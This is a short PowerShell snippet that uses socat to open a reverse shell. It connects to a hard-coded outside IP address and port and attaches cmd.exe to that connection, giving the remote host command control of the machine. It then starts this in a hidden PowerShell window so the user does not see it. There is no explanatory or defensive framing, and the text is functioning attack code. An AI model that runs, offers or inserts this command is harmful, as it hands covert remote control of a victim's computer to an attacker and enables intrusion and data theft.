$command = ".\socat.exe tcp-connect:18.229.146.63:19603 exec:""cmd.exe"",pipes"
Start-Process "powershell.exe" -ArgumentList "-NoProfile -Command `"& { $command }`"" -WindowStyle Hidden